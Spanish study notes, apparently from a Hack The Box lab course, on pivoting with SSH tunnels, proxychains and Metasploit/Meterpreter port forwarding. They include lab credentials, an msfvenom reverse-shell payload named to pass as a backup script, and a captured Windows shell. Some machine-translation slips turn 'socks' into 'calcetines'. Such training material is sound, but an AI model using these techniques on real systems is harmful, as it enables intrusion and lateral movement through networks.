![[Pasted image 20240605151052.png]]
#### Ejecución del reenvío de puerto local por ssh
```python
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

#### Reenvío de múltiples puertos

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

#### Habilitación del reenvío dinámico de puertos con SSH

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
G41i130Q@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64

	# nota: de esta manera podemos enviar todo el trafico de la maquina numero 3 (maquina final) hacia nuestra maquina por el puerto 9050 que esta configurado usando el proxychains
```

#### Enumeración del destino de Windows a través de Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains nmap -v -Pn -sT 172.16.5.19
```

#### Usando xfreerdp con Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

#### Configuración del proxy SOCKS de MSF

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Después de iniciar el servidor SOCKS, configuraremos cadenas proxy para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivote en el host Ubuntu comprometido. Podemos agregar la siguiente línea al final de nuestro `proxychains.conf` archivo ubicado en `/etc/proxychains.conf` si no está ya allí.

#### Agregar una línea a proxychains.conf si es necesario

Túneles y reenvío de puertos de Meterpreter

```shell-session
socks4 	127.0.0.1 9050
```

Nota: Dependiendo de la versión que esté ejecutando el servidor SOCKS, es posible que ocasionalmente necesitemos cambiar calcetines4 a calcetines5 en proxychains.conf.

Finalmente, necesitamos decirle a nuestro módulo calcetines_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el `post/multi/manage/autoroute` Módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas de proxy.

#### Crear rutas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con autorruta ejecutando autoroute desde la sesión de Meterpreter.

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar las rutas necesarias, podemos usar el `-p` opción para enumerar las rutas activas para asegurarnos de que nuestra configuración se aplique como se esperaba.

#### Listado de rutas activas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar cadenas proxy para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.

#### Prueba de funcionalidad de enrutamiento y proxy

Túneles y reenvío de puertos de Meterpreter

```python
G41i130Q@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

#### Opciones de puerto

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

#### Creación de retransmisión TCP local

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión de Meterpreter que inicie un detector en el puerto local de nuestro host de ataque ( `-l`) `3300` y reenviar todos los paquetes al control remoto ( `-r`) Servidor de windows `172.16.5.19` en `3389` puerto ( `-p`) a través de nuestra sesión de Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.

#### Conexión a Windows Target a través de localhost

Túneles y reenvío de puertos de Meterpreter

```python
G41i130Q@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Reenvío de puerto inverso de Meterpreter

De manera similar a los reenvíos de puertos locales, Metasploit también puede realizar `reverse port forwarding`con el siguiente comando, donde es posible que desee escuchar en un puerto específico en el servidor comprometido y reenviar todos los shells entrantes desde el servidor Ubuntu a nuestro host de ataque. Iniciaremos un escucha en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor Ubuntu que reenvíe todas las solicitudes recibidas al servidor Ubuntu en el puerto. `1234` a nuestro oyente en el puerto `8081`.

Podemos crear un puerto inverso hacia adelante en nuestro shell existente del escenario anterior usando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234` ejecutándose en el servidor Ubuntu a nuestro host de ataque en el puerto local ( `-l`) `8081`. También configuraremos nuestro oyente para escuchar en el puerto 8081 para un shell de Windows.

#### Reglas de reenvío de puertos inversos

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

#### Configuración e inicio de multi/handler

Túneles y reenvío de puertos de Meterpreter

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos crear una carga útil de shell inverso que enviará una conexión de regreso a nuestro servidor Ubuntu en `172.16.5.129`: `1234`cuando se ejecuta en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `attack host's ip`: `8081` que configuramos.

#### Generando la carga útil de Windows

Túneles y reenvío de puertos de Meterpreter

```shell-session
G41i130Q@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows pivotado a través del servidor Ubuntu.

#### Estableciendo la sesión de Meterpreter

Túneles y reenvío de puertos de Meterpreter

```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```